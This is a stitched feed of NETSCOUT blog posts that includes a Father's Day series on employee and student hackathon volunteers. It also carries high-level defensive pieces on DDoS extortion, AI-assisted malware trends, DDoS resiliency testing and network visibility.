<p>At NETSCOUT, we love to make a difference, and our hackathon partnership with <a href="https://shooting-stars-foundation.org/">Shooting Stars Foundation</a> to sponsor <a href="https://shooting-stars-foundation.org/hackathon">StarHacks</a> is a perfect example. The StarHacks helped to expose students to technology and STEM careers, and they also brought NETSCOUT families together.</p>

<p>In honor of Father’s Day, we are profiling NETSCOUT dads and their student leaders in a three-part series about at their hackathon experience.</p>

<p><strong>This week, we feature Abhay Silina and Harsha Silina.</strong></p>

<p>Abhay is a rising sophomore majoring in data science at Purdue University, and Harsha is a senior director of IT application development at NETSCOUT.</p>

<p><img alt="Abhay Silina and Harsha Silina" data-entity-type="file" data-entity-uuid="ff401136-7cc1-4230-abba-c00b35072623" src="http://localhost:7996/sites/default/files/inline-images/abhay2.jpg" /></p>

<p><strong>ABHAY</strong>: I worked on two hackathons: StarHacks 2019 in Westford, Massachusetts and StarHacks 2020 in Lowell, Massachusetts. I got involved in my first hackathon through the Shooting Stars Foundation. I decided to do it again because it was a fantastic learning experience to understand the process of planning and executing a public event. Additionally, I loved working with my team, which made every meeting enjoyable.</p>

<p>For the 2019 hackathon, I was the lead student organizer, delegating tasks to my team and managing many jobs during the event. No one in our group had ever planned an event of this magnitude, so honestly, everything was challenging. However, the most challenging part was probably adjusting during the event itself. Many unanticipated scenarios occurred on the day of the hackathon. We had to think on the fly and adapt our plan several times.</p>

<p>During the 2020 hackathon, I served as a mentor to allow my team members to get more involved. I gave insight to the new leadership on approaching planning the next hackathon and additionally helped with several activities during the day of the hackathon. The hardest part of my new role was allowing the new leadership to plan differently than how I imagined it.</p>

<p>An unexpected benefit that came out of the hackathon was learning how to manage money. We had only a certain amount of money, and we had to make tough decisions to allocate that money to the right things. Financial management is a skill we all need. Now in college, I have to constantly decide how much money to spend on food, textbooks, apartment utilities, and more. Having this experience helped me understand how to manage my finances.</p>

<p>Working with my dad was amazing. I never knew what a great leader he is. He led several of his colleagues to create an app to make check-in a seamless process, helped all the participants with their laptop issues, and managed all the technology used at the event.</p>

<p>Overall, I am incredibly grateful to NETSCOUT for the opportunity to be part of such a fantastic event. I learned so much, and I would highly recommend that everyone pursue any opportunity to participate in similar events. You never know how much fun you can have doing something like this until you do it.</p>

<p><strong>HARSHA: </strong>When I first heard about the hackathon event, it was a new and exciting initiative for which to volunteer. Simply put, it was a team-building exercise, which became an opportunity to meet and collaborate with like-minded volunteers.</p>

<blockquote style="margin: 0 1rem 30px 1rem; padding: 1rem; background-color: #EFF0F0; border-left: 5px solid #97D700;"><strong style="font-style: normal;">Harsha's ideal Father’s Day:</strong><br />
Spending time with family, maybe hiking and throwing the football with my son, is my way of enjoying Father’s Day.</blockquote>

<p>The idea behind the hackathons was to provide problem-solving opportunities to middle school and high school students. The hackathons provided them with a platform for learning and developing many skills, including identifying real-world problems, brainstorming solutions, doing team presentations, making new friends, and more. The events involved countless meticulous planning and execution hours from the volunteers—including the student volunteers, who gained valuable hands-on experience to help them grow into future leaders. Considering all the benefits, volunteering in successive events was a no-brainer. It is rewarding to see the next generation learning from the opportunities we create.</p>

<p>When I approached Abhay about volunteering, I did not have answers for the simple questions he had. All I said was, “I don’t know much; we all will be learning together to figure this out. If you are OK with this, then you will be fine.” The entire event planning process was iterative; none of us had done this before. The student volunteers provided interesting suggestions, stepped up on many tasks, and were excited to work with the rest of the volunteer team leading up to and during the events. They showed immense growth during this process, which was satisfying to observe.</p>

<p>I was pleasantly surprised at how Abhay embraced the idea behind the event, embodied the spirit of volunteering, developed leadership traits, and honed his public speaking and presentation skills.</p>

<p>Working closely with my colleagues on this has been a fun experience. None of us had organized a hackathon before, and their creativity and energy was inspiring. The first hackathon during March 2019 was a 14-hour nonstop busy day. It was a successful event. We were crazy enough to sign up for the successive events. </p>

<p>I am very thankful to NETSCOUT for providing these excellent opportunities for my son and me to volunteer together. They are priceless moments; we learned from each other!</p>

  <title>Continuous Monitoring with NETSCOUT Omnis Cyber Investigator and AWS Security Hub</title>
  <link>http://localhost:7996/blog/oci-and-aws-security</link>
  <description>Integration between NETSCOUT Omnis Cyber Investigator and AWS Security Hub enables IT teams to effectively detect, validate, investigate, and respond to cyberthreats, whether on-premises or in the cloud.</description>
  <content:encoded><![CDATA[<p>As one of the most popular public clouds today, Amazon Web Services (AWS) is built to support a new breed of distributed, connected applications designed to help businesses cut time to market and improve customer satisfaction. However, to reap the full benefits of AWS in a hybrid cloud world, companies need to rethink how they approach security.</p>

<p>Here’s why: As organizations migrate workloads to the cloud, infrastructure becomes more complex. To combat an increase in the attack surface and exposure to threats, enterprises need visibility that does not begin and end at each physical boundary. Existing domain-specific tools can’t fill the huge monitoring gap, because they are unable to deliver seamless, uniform visibility and common situational awareness across SecOps, NetOps, and ITOps teams, which collectively are responsible for defending against threats that span cloud, on-premises, and hybrid environments.</p>

<p>Strengthening security and reducing business risk, therefore, requires going beyond traditional cloud security to control incoming and outgoing traffic. A shared-responsibility security model requires a smart platform that illuminates threats everywhere, anywhere, and anytime.</p>

<p>Join experts from AWS and NETSCOUT in a new webinar to learn how the two <a href="https://aws.amazon.com/security-hub/partners/">partnered</a> to deliver a <a href="https://www.netscout.com/solutions/cyber-investigator-aws">new foundation for hybrid cloud security</a>. NETSCOUT Omnis Cyber Investigator with AWS Security Hub exposes risks that exist in hybrid cloud interdependencies by transforming network traffic and global threat intelligence feeds into smart data while decreasing operational overhead and providing efficiencies in security-threat mitigation.</p>

  <title>Jordan Under Attack</title>
  <link>http://localhost:7996/blog/jordan-under-attack</link>
  <description>A year in review: Detailed DDoS attack data for Jordan</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our weekly series focuses on DDoS activity in specific countries.

  <title>Are You Prepared for AI Malware?</title>
  <link>http://localhost:7996/blog/are-you-prepared-ai-malware</link>
  <description>Artificial intelligence has provided malware authors with a range of new opportunities. Is your organization prepared to meet the challenge as adversaries change tactics and employ new techniques?</description>
  <content:encoded><![CDATA[<p>The concept of using artificial intelligence (AI) in cybersecurity is not new. Indeed, many organizations use AI as part of an in-depth security protocol. The trouble is, hackers now have easy access to the same sophisticated techniques that enterprises do, and they are nothing if not motivated. As <a href="https://www.netscout.com/what-is/malware">malware</a> becomes more stringent, smarter, and undetectable, are enterprise teams and tools ready for the challenge?</p>

<p>Although primitive, hackers have already included components such as building countermeasures into malware to detect runtime environments or sense detection attempts.</p>

<p>These early actions serve as a foundation for the development of more-critical thought about adaptive and evasive technologies and sophisticated situational awareness. As adversaries attempt to outsmart the companies and researchers trying to thwart them, using a combination of research and deep targeting is likely the future of malware.</p>

<p><strong>Adaptive and Evasive Technology</strong></p>

<p>Malware has always adapted to its environment, and AI has provided malware authors with a range of new opportunities. The days of using code to analyze behavior are coming to an end. The combination of a network card and specific geolocation is enough for malware to begin reconnaissance, so why risk getting caught doing resource development when those resources may not produce the results the malware author desires?</p>

<p>Suppose, for example, that the intended target is the corporate campus in Milwaukee, Wisconsin, and the malware senses it is in Berlin, Wisconsin. That 82-mile difference could mean the infected host is nearby but not exactly where the author intends to carry out the next move. In this case, the malware might sleep for 15 days and try again. If that attempt fails, the malware will adapt to its host environment and employ other resource development behaviors. This chess game is often complicated, but readily available models and actions make it easier for malware authors to play it successfully.</p>

<p><strong>Deep Targeting</strong></p>

<p>Marketers have used deep-targeting tactics for decades now. Learning the behaviors, habits, and values of individuals or groups is the staple of successful advertising campaigns. It stands to reason that this type of research and technology would bleed over to bad actors and malware authors.</p>

<p>There are numerous ways to use deep targeting against (often) unsuspecting victims. End-user behavioral analysis (UBA) is a product or tagline for many cybersecurity companies, because professionals who spot deviations can trigger security alerts.</p>

<p>Cybercriminals also use UBA to learn user behaviors and blend into their targets’ surroundings. The era when malware woke up at 3:00 a.m. to execute its attack is long gone. Now, 3:00 p.m. is when the user is busiest, which gives hackers better cover for slipping in a few illicit data packets here and there.</p>

<p>Another consideration with deep targeting is where to launch the initial hack. Social media is a treasure trove of useful metadata and behaviors. Getting users to click on a topic they feel passionate about is much easier than getting someone to interact with an off-topic post. Blending into social, political, and economic conversations takes little effort, and branching those topics opens many potential pathways for targeting victims. Now it is just a matter of cybercriminals prepping the audience and biding their time to launch the real objective: a nefarious campaign.</p>

<p><strong>Spear Phishing via a Service</strong></p>

<p>Spear phishing via a service employs third parties rather than targeting enterprise email channels directly. Unfortunately, mining social media (both personal and professional) is both simple and effective. Mapping an executive’s profile to a favorite charity gives a clear roadmap into content that has a high probability of ensnaring a new victim.</p>

<p><strong>Determining Physical Location</strong></p>

<p>Information about a target’s physical location can include various details, including the position of critical resources and infrastructure. This data may also indicate whether the victim operates within a legal jurisdiction or authority. Knowing those specifics allows adversaries to act quickly.</p>

<p><strong>Environmental Keying</strong></p>

<p>Hackers may environmentally key payloads or other malware features to evade defenses. This method uses cryptography to constrain execution or actions based on specific adversary-supplied conditions present in the target area.</p>

<p><strong>Data Destruction</strong></p>

<p>This tactic focuses on destroying files on specific network systems and interrupting availability of services and resources. By overwriting content from local and remote drives, cybercriminals render stored data unrecoverable by forensic techniques.</p>

<p><strong>Are You Ready for the Challenge?</strong></p>

<p>Thankfully, the answer is more likely “yes” than “no.” The fundamentals still apply; the challenges will likely just come faster and with more variety. The past months have shown us that our strategies and biases are tested continuously. As noted, the vast majority of the time, the security fundamentals win. When they fail, however, there is the chance that they will fail massively. Mapping AI-based malware and campaigns via tried-and-true frameworks is a great way to remain informed as adversaries change tactics, employ new techniques, and attempt to use norms against their target.</p>

  <content:encoded><![CDATA[<h2 class="ns-h2">ASERT Threat Summary</h2>

<p><strong>Date/Time: </strong>&nbsp;17June2021 1300UTC<br />
<strong>Severity:</strong> Warning<br />
<strong>Distribution: </strong>TLP: <a href="https://www.us-cert.gov/tlp">WHITE</a><br />
<strong>Categories: </strong>Availability<br />
<strong>Contributors:</strong> Jon Belanger, Richard Hummel.</p>

<h3>Executive Summary</h3>

<p>In May 2021, self-designated threat actor(s) ‘Fancy Lazarus’ began a new campaign of distributed denial-of-service (DDoS) extortion attacks against organizations. &nbsp;The attacks followed a familiar pattern: After launching demonstration DDoS attacks, Fancy Lazarus then threatened to follow up with a more devastating attack against critical asset unless the victim paid a demanded sum via Bitcoin cryptocurrency. The threat actor behind this campaign appears to be leveraging the success of what we call the Lazarus Bear Armada (LBA) campaign. &nbsp;The extortion demand verbiage is copied almost verbatim from that of the LBA campaign, although the threat actors have changed the name to ‘Fancy Lazarus’ and decreased the amount of Bitcoin demanded. Unlike the ongoing LBA campaign, the Fancy Lazarus campaign appears less sophisticated, and targets a narrower victim base. It also leverages different attack methodology against their victims. NETSCOUT has yet to observe Fancy Lazarus campaign attacks accomplish their claim of 2 TBps attacks, and thus far they have had little to no impact on customer networks.</p>

<h3>Key Findings</h3>

<ul>
	<li>Actors behind a new DDoS extortion campaign self-dubbed ‘Fancy Lazarus’ leverage the ongoing LBA campaign in name and credibility.</li>
	<li>The threat actors behind the Fancy Lazarus DDoS extortion campaign have targeted various broadband access and transit Internet Service Providers (ISPs) in the United Kingdom (UK), Ireland, Scandinavia, and western Europe. &nbsp;Specifically, many of these attacks were launched against authoritative DNS servers. The attack bandwidth upper limit is around 72 Gbps and consists of DNS reflection/amplification attacks, DNS water torture attacks, RST floods attacks, and TCP reflection/amplification attacks.</li>
</ul>

<h3>Overview</h3>

<p>Beginning in May 2021, a threat actor with the self-assigned designation ‘Fancy Lazarus’ launched a series of DDoS extortion attacks largely directed towards broadband access and transit ISPs located in the UK, Ireland, Scandinavia, and western Europe. These attacks are characterized by the attacker launching a demonstration DDoS attack against authoritative DNS servers operated by targeted organizations, followed by an emailed extortion demand for payment via Bitcoin (cryptocurrency. &nbsp;</p>

<p>The extortion demands typically state that the attacker has up to 2 TBps of DDoS attack capacity at the ready and threatens follow-up attacks if the extortion payments aren’t transmitted to the attacker within a set period. To date, no follow-up attacks have been observed against organizations that do not comply.</p>

<p>The threat actor responsible for this attack campaign has directly copied the language of publicly posted extortion demand email messages previously sent to targeted organizations by the LBA DDoS extortionist threat actor, changing the self-attribution to ‘Fancy Lazarus’ and reducing the demanded extortion amount. Due to observed differences in levels of pre-attack reconnaissance, attack efficacy, and persistence, it appears that the Fancy Lazarus DDoS attack campaign is the work of a copycat rather than the LBA threat actor.</p>

<p>The primary attack vectors observed in this campaign are DNS reflection/amplification attacks, DNS non-existent record attacks (also known as ‘DNS water torture’ attacks), RST floods, and TCP reflection/amplification attacks.</p>

<p>The maximum attack volumes, or bandwidth, observed over the course of this attack campaign are 72 GBps and 7.3 Mpps, respectively. While the attacker has claimed to have up to 2 TBps of DDoS attack capacity, no attacks approaching this magnitude have yet occurred.&nbsp;</p>

<p>Pre-attack reconnaissance appears largely limited to the identification of authoritative DNS servers operated by the targeted organization. Recipients chosen to receive the attacker’s extortion demands appear to have been selected based on perusal of the target’s public-facing websites and social media searches. The cited names of targeted organizations included in the body of extortion demands appear to have been copied from WHOIS records associated with CIDR blocks assigned to the target, even when those names do not correspond to the target’s public branding.</p>

<p>While in many cases emailed DDoS extortion demands are never viewed by their intended targets due to poor email address selection on the part of the attacker, in this instance, it appears that the threat actor in question has exercised due diligence in identifying email mailboxes that are likely to be actively monitored by targeted organizations.</p>

<h3>Collateral Impact</h3>

<p>The collateral impact of these DDoS attacks can be significant for end customers whose authoritative DNS service is provisioned on targeted DNS servers. A successful DDoS attack against DNS servers that are authoritative for a given domain can result in unresolvability for the DNS records of end-customer internet properties, thus rendering them inaccessible to legitimate users.</p>

<h3>Mitigating Factors</h3>

<p>As is the case with most DDoS attacks, targeted organizations that have adequately prepared in advance to defend their public-facing internet properties and related infrastructure have experienced little or no significant negative impact related this DDoS extortion campaign.</p>

<h3>Recommended Actions</h3>

<p>Organizations with business-critical public-facing internet properties should ensure that all relevant network infrastructure, architectural and operational Best Current Practices (BCPs) have been implemented, including situationally specific network access policies that only permit internet traffic via required IP protocols and ports. Internet access network traffic to/from internal organizational personnel should be deconflated from internet traffic to/from public-facing internet properties and served via separate upstream internet transit links. &nbsp;<br />
Authoritative DNS services should also be designed, deployed, and operated in a manner consistent with all relevant BCPs.</p>

<p>Upon receipt of any demands for DDoS extortion payments, targeted organizations should immediately engage with their peers/transit ISPs, MSSPs, and situationally appropriate law enforcement organizations. They should ensure that their DDoS defense plans are activated and validated and maintain a vigilant alert posture.</p>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situationally appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. Organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack and are included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing web servers were adequately protected but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks and resources. The relevant NETSCOUT account teams and/or Arbor’s Technical Assistance Center (ATAC) may be consulted with regards to optimal countermeasure selection and employment.</p>

<p>It should be noted that while observed levels of pre-attack reconnaissance, attack efficacy, and persistence do not correspond to those exhibited by the LBA threat actors, adequate preparation and enhanced situational awareness are always key to successfully mitigating DDoS attacks in any context.</p>

  <title>Making Hackathons a Family Affair</title>
  <link>http://localhost:7996/blog/families-that-hack-together-2</link>
  <description>NETSCOUT dads and kids pitch in on student hackathons that help build interest in IT careers across underrepresented communities.</description>
  <content:encoded><![CDATA[<p><em>Second in a three-part series</em></p>

<p>At NETSCOUT, we love to make a difference, and our hackathon partnership with <a href="https://shooting-stars-foundation.org/">Shooting Stars Foundation</a> to sponsor is a perfect example. The StarHacks helped to expose students to technology and STEM careers, and they also brought NETSCOUT families together.</p>

<p>In honor of Father’s Day, we are profiling NETSCOUT dads and their student leaders in a three-part series about at their hackathon experience.</p>

<p><strong>This week, we feature Iman Kiio and Dan Kiio</strong></p>

<p>Iman is an incoming freshman majoring in computer science at Cornell University, and Dan is a senior support engineer, GTAC, at NETSCOUT.</p>

<p><img alt="Hackathon Family Photo" data-entity-type="file" data-entity-uuid="dc8262ff-f9f5-40eb-ae44-8d43cb246110" src="http://localhost:7996/sites/default/files/inline-images/hacker_family_photo_2.jpg" /></p>

<p><strong>IMAN:</strong> I got involved through my Dad and worked on three hackathons: StarHacks 2019 in Westford, Massachusetts, StarHacks 2020 in Lowell, Massachusetts, and virtual StarHacks 2021. For my first StarHacks, I was a sophomore in high school. That hackathon was challenging, because it was the first time this event had occurred in our area. My peers and I had to figure out what resources to use, the location, and how to make the event run smoothly. I was responsible for managing a budget of $3,000, co-organizing meetings for the student organizers, and planning for the food. Also, we spent hours of our own time creating the schedule, reaching out to sponsors by literally knocking on doors and going to businesses, and marketing to promote the event.</p>

<p>Being a part of the hackathon helped to strengthen my interest in technology. I learned about how science and technology can inspire young kids to come up with interesting and fun solutions to make a difference. Working with my dad was fun. I enjoyed spending time with him to come up with a way to help young kids learn simple coding. I also learned about my dad’s interest in technology and service to the community.</p>

<p><strong>DAN:</strong> I had reached out to our Heart of Giving team to see how NETSCOUT might be able to get involved in a local STEM event for girls that Iman was participating in. After that interaction, I was invited to join a team to launch the first series of hackathons in Westford. I had a lot of fun the first time, so I came back for more.</p>

<blockquote style="margin: 0 1rem 30px 1rem; padding: 1rem; background-color: #EFF0F0; border-left: 5px solid #97D700;"><strong style="font-style: normal;">Dan's ideal Father’s Day:</strong><br />
Father’s Day is one of the few times in the year I get out and play a round of golf.</blockquote>

<p>When the team said they were looking for student leaders, I asked Iman. Working with her on the hackathons, I found out how much she enjoys technology and teaching coding to kids—she also does that during her spare time. </p>

<p>With the last hackathon, which was held virtually, it was a pleasant surprise to find out that kids from all over the world love technology and are very enthusiastic about it. Most encouraging were the all-girl teams, because they came in either first or second. So, I am glad my daughter is in good company.</p>

<p>I learned a lot from the kids—probably learned more from them than they learned from me. They are very tech-savvy, and their prototypes look amazing. Just let kids run with their ideas, and you will be pleasantly surprised. They embrace the opportunity to use their creativity to help make interesting solutions, and it is fun to watch.</p>

  <title>The Families That Hack Together</title>
  <link>http://localhost:7996/blog/families-that-hack-together-1</link>
  <description>NETSCOUT dads and kids pitch in on student hackathons that help build interest in IT careers across underrepresented communities.</description>
  <content:encoded><![CDATA[<p><em>First of a three-part series</em></p>

<p>Technology and other STEM career paths offer rich opportunities, but not everybody knows how to access them. That’s why one of the goals of NETSCOUT’s social impact programs is to help open that career door by building interest in IT careers across communities that are often underrepresented in tech.</p>

<p>The best way to get kids involved is to combine learning and fun, so NETSCOUT has sponsored seven student hackathons since 2019, ranging from local affairs to virtual events with global participation.</p>

<p>As part our student outreach, we partnered with <a href="https://shooting-stars-foundation.org/">Shooting Stars Foundation</a> to sponsor <a href="https://www.starhacks.tech/">StarHacks</a>—fun, educational, and collaborative beginner’s hackathons designed to expose students to technology and STEM careers. We make a specific effort to include students from cities near our offices as well as youth organizations from underserved communities.</p>

<p>In addition to providing the satisfaction of working with students, a hackathon is an intense team-building opportunity for employee volunteers, who get to meet and work with people across the company. Because the Shooting Stars model engages students as event leaders, we also have the pleasure of working with NETSCOUT family members who stepped up as leaders for these hackathons. </p>

<p>In honor of Father’s Day, we are profiling NETSCOUT dads and their student leaders in a three-part series about a their hackathon experience.</p>

<p><strong>First up: Hannah Gosselin and Mark Gosselin</strong></p>

<p><em>Hannah is a rising junior majoring in information technology at Rochester Institute of Technology. Mark is a director for R&amp;D Labs at NETSCOUT.</em></p>

<p><strong><img alt="Hannah and Mark Gosselin" data-entity-type="file" data-entity-uuid="4c94699a-d9b3-4d96-9ca6-3d5646024a48" src="http://localhost:7996/sites/default/files/inline-images/hacker_family_photo.jpg" /></strong></p>

<p><strong>HANNAH</strong>: My dad heard about the StarHacks hackathon and asked if I would be interested in helping. I was a senior in high school and had never been part of a hackathon before, but the idea always intrigued me. The first time my dad and I worked together was for StarHacks 2019. While working with my dad, I realized that we shared more of an interest in technology than I originally thought. Although I had already decided to study IT in college, becoming a student leader definitely made me more passionate about my field of study. Having the opportunity to see so many kids get excited and take part in the field I was going into made me look forward to it more.</p>

<p>Since then, I have participated in several more hackathons, because I love the way they encourage students to get more involved in the tech world and be creative. So far, I’ve worked on four hackathons, including StarHacks 2019 in Westford, Massachusetts, and StarHacks 2020 in Lowell, Massachusetts. The two most recent hackathons, StarHacks 2021 and WicHacks 2021 at RIT, were virtual, and I was in Rochester, New York, for both of them. One of the most challenging parts was organizing remote hackathons. We had to figure out a way to engage with more than 100 students (and each other) in an entirely virtual manner, which was a new challenge for me. Best of all, one of the teams I was assigned to mentor for StarHacks 2021 (team 18) won!</p>

<p>At my first event, I became better connected with several of the NETSCOUT employees who assisted with the event, which came in handy that summer when I worked as an intern for NETSCOUT and already knew multiple employees. At WicHacks 2021, I connected with other students from all over the world who share an interest in the tech field. I still regularly keep in touch with some of them.</p>

<p><strong>MARK</strong>: For the first Westford hackathon, I was asked to help find student leaders because of my nonprofit board service at <a href="https://www.ydolawrence.org/">YDO-Lawrence</a>. I also asked Hannah if she would be interested. We volunteer as a family a great deal. We feel it’s important for us to give back to the community, and the fact that NETSCOUT is so supportive of those efforts makes it much easier.</p>

<blockquote style="margin: 0 1rem 30px 1rem; padding: 1rem; background-color: #EFF0F0; border-left: 5px solid #97D700;"><strong style="font-style: normal;">Mark’s ideal Father’s Day:</strong><br />
I like to do absolutely nothing! It is one day of the year where I don’t feel guilty just hanging out with the family.</blockquote>

<p>It was great to see my daughter passionate about technology. Prior to her senior year in high school, she was unsure of what she wanted to study, and she’d recently taken an interest in technology. She decided that was where she wanted to go and hasn’t looked back. I was amazed at the maturity she showed in dealing with my coworkers. I felt a great sense of pride seeing what a mature person she has grown into. </p>

<p>My favorite hackathon was the event we hosted at<a href="https://www.uml.edu/innovation-hub/"> UMass Lowell’s Innovation Hub</a>. This event had representatives from local nonprofits present real-world challenges for the students to address. I enjoyed seeing students engaged in technology, working together to provide solutions to real-world problems.</p>

<p>Being part of the hackathon has allowed me to interact with other NETSCOUT employees I normally would not work with in my day-to-day job. Employees from all departments and locations are encouraged to volunteer. I’ve also learned a great deal about the lives of coworkers during downtime at the events. </p>

  <title>Top Three Tactics for Optimizing DDoS Resiliency Testing</title>
  <link>http://localhost:7996/blog/top-three-tactics-optimizing-ddos-resiliency-testing</link>
  <description>DDoS attacks are on the rise exponentially—in terms of both frequency and size. Protect your business by proactively testing the resilience of your systems.</description>
  <content:encoded><![CDATA[<p><em>Written by Mark Gardner, Director of Global Sales, NETSCOUT Test Optimization Business Unit</em></p>

<p>Cybersecurity is built to protect computer systems and networks from theft, damage, and service disruption from attacks such as <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service</a> (DDoS). DDoS attacks work by taking a target website or online service offline by overwhelming the target or its surrounding infrastructure with a flood of internet traffic.</p>

<p><br />
Although DDoS attacks have been around for more than 20 years, they remain something of a moving target as cybercriminals regularly discover and weaponize new attack vectors and techniques, such as the following:</p>

<ul><li>Launching different types of attacks such as volumetric, TCP state-exhaustion, and application-layer attacks simultaneously as multivector attacks, each with a unique signature. </li>
	<li>Using different botnets to change the source of attacks and stay one step ahead of blocked IP addresses.</li>
	<li>Using DDoS attacks as a smoke screen to distract from the real cybercrime underway. DDoS traffic can consist of incoming messages, requests for connections, or fake packets. </li>
</ul><p>But here’s the catch: attacks are based on legitimate traffic, and it can be difficult to determine which traffic is legitimate “good” traffic and which is the “bad” traffic. Therefore, you must continually test your web servers and services, cloud offerings, and network topology for their ability to allow good traffic to pass through while stopping the bad traffic.</p>

<p>The reality is that a DDoS attack is a matter of “when,” not “if.” With that in mind, this is what we recommend for verifying your resiliency to DDoS attacks:</p>

<p>1. <strong>Test your solutions.</strong> All DDoS mitigation solutions are tested. The question is whether the testing is conducted in a proactive, controlled manner or by a real attack. Proactive testing is a far better plan, because it gives you a chance to fix issues outside the stress of a real attack in which services might be failing. All public-facing services are subject to attack and should be tested. In addition to web servers, this includes session border controllers (SBCs), unified communication and collaboration (UC&amp;C) systems, edge routers, and others.</p>

<p>2. <strong>Test regularly, particularly after significant upgrades.</strong> For example, one U.S. service provider tests the resiliency and vulnerability of cloud-based virtual environments prior to providing them to its commercial accounts. A second company—a network equipment manufacturer—tests for DDoS resiliency during preproduction testing of embedded mitigation software in a series of its hardware and software solutions. In one test, for example, the company found a product’s CPU (I/O card) was pegged at 99 percent after sending only 1 Gbps of TCP SYN traffic, which blocked “good” traffic from passing as initially expected. The company was therefore able to adjust the software prior to commercial launch.</p>

<p>3. <strong>Test by using customized attack simulations.</strong> One of the best ways to check how well your defenses can differentiate between good traffic and bad traffic is to launch attacks alongside good traffic. A good testing tool will let companies easily create custom multivector attacks that integrate into the existing test and mitigation infrastructure. Launching simulated attacks allows companies to find and fix issues before they are discovered in the heat of a real attack.</p>

<p>DDoS attacks are on the rise exponentially—in terms of both frequency and size (bandwidth consumed). The latest <a href="https://www.netscout.com/threatreport">NETSCOUT Threat Intelligence Report</a> highlighted record-breaking DDoS attack activity in 2020, with more than 10 million observed attacks.</p>

<p>Additionally, DDoS attack costs are increasing globally. According to a recent NETSCOUT <a href="https://www.netscout.com/sites/default/files/2019-03/SECR_005_EN-1901%E2%80%93WISR.pdf">Worldwide Infrastructure Security Report</a>, the cost of downtime associated with internet service outages caused by DDoS attacks was $221,836.80, while a <a href="https://www.helpnetsecurity.com/2020/11/27/cyber-insurance-claims-rise/">report</a> from Allianz Global Corporate &amp; Specialty found that the average cost of a cybercrime to an organization increased by 70 percent over five years, to $13 million. Can your business really afford <em>not</em> to test your DDoS resiliency?</p>

  <title>Work-from-Home Trend Puts SaaS in the Crosshairs</title>
  <link>http://localhost:7996/blog/work-home-trend-puts-saas-crosshairs</link>
  <description>When remote employees report suboptimal workflow performance in SaaS services, IT must find the cause. Implementing cloud monitoring instrumentation at remote locations is one way to address the challenge.</description>
  <content:encoded><![CDATA[<p>The COVID-19 pandemic drove massive growth in the global remote workforce, a change that seems likely to persist into a post-pandemic world. That shift also fueled a greater reliance on a mixture of software-as-a-service (SaaS) and on-premises services. In fact, according to a recent <a href="https://cdn2.hubspot.net/hubfs/2093754/eBooks/2020%20SaaS%20Trends%20Report.pdf">report</a>, overall spend per company on SaaS products was up 50 percent in 2020. Reliable, fast access is essential to core business operations, putting pressure on IT teams to make sure that remote users maintain a high-quality user experience when accessing services over a software-defined wide area network (SD-WAN).</p>

<p><strong>Reports of Slow Workflows Can Lead to Finger-Pointing</strong></p>

<p>When employees working remotely begin to report suboptimal workflow performance in critical SaaS services, IT must find out what is causing the problem. Poor performance of SaaS business services, whether in the form of slowdowns or even unresponsiveness, can ultimately impact employee efficiency and motivation. This, in turn, can affect the ability of the business to meet the demands of its customers.</p>

<p>Without visibility into vital cloud services, IT has no means to determine the precise source of the problem, which can then result in a finger-pointing scenario between IT and the SaaS service provider. It’s not hard to envision a scenario in which IT thinks the root cause of a sluggish application lies with the SaaS provider, while the provider suggests that the internet links from the company’s remote sites, or the Wi-Fi within the site, is the cause of the problem.</p>

<p><strong>Service Edge Visibility Is Key to Cloud Service Performance</strong></p>

<p>IT can address this issue by implementing service edge instrumentation at remote locations, while also conducting synthetic tests to assess the end-user experience. This approach can quickly detect and visualize performance issues such as application delays with SaaS workflows. Armed with these invaluable insights, IT can identify and document when a third-party SaaS provider is responsible for an issue. Cloud monitoring enables IT to close visibility gaps, identify root causes, and designate remediation ownership. In the previously cited example, that visibility would enable IT to rule out other potential performance issues, such as Wi-Fi or the internet, and demonstrate that intelligence to the SaaS provider. After all, hard evidence has a way of shutting down the finger-pointing cycle.</p>

<p>Cloud monitoring is especially important for businesses that rely on multiple SaaS providers. As is often the case, providers may be unaware of the performance issue within their own service, so it falls to a business customer’s IT team to pinpoint the problem. With evidence in hand, IT and the SaaS provider can then collaborate to quickly improve responsiveness of the service for end users—a win-win for both the enterprise and the SaaS provider.</p>

  <title>Visibility Extended to Remote Medical Buildings for Protecting Healthcare Services</title>
  <link>http://localhost:7996/blog/network-visibility-protecting-healthcare</link>
  <description>Overview of how a healthcare company protected the performance and availability of healthcare services, as well as end-user experience for doctors, nurses, and clinicians in a newly added medical building.</description>
  <content:encoded><![CDATA[<p>There are three general location areas for visibility in complex enterprise networks today: client, network, and service edges. An edge is the boundary between IT domains or technologies. These are the integration points between users, networks, and applications. For example, there is a service edge between a home or branch office and the Internet Service Provider (ISP), WAN and data center, or ISP and Co-lo and<a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="e1efb5d3-cfc8-4842-8beb-2f70fe1bb238" href="http://localhost:7996/solutions/saas-ucaas" title="Ensuring High-Quality Experience with SaaS and UCaaS Applications"> SaaS</a>. These transition points are where IT ownership changes, and control and visibility are lost or at the very least hindered. </p>

<p>From a practical perspective, many enterprises have deployed visibility in their core data center environments. As digital transformations and strategic growth and acquisitions have occurred, they have found similar visibility gaps. Such was the case recently for a <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="3100d439-fef5-4cac-8d3e-a9217745ce40" href="http://localhost:7996/solutions/healthcare" title="Healthcare">healthcare organization</a> engaged in a strategic building initiative designed to expand the main hospital campus and add patient and research facilities staffed by doctors, nurses, research associates, scientists, and essential staff. </p>
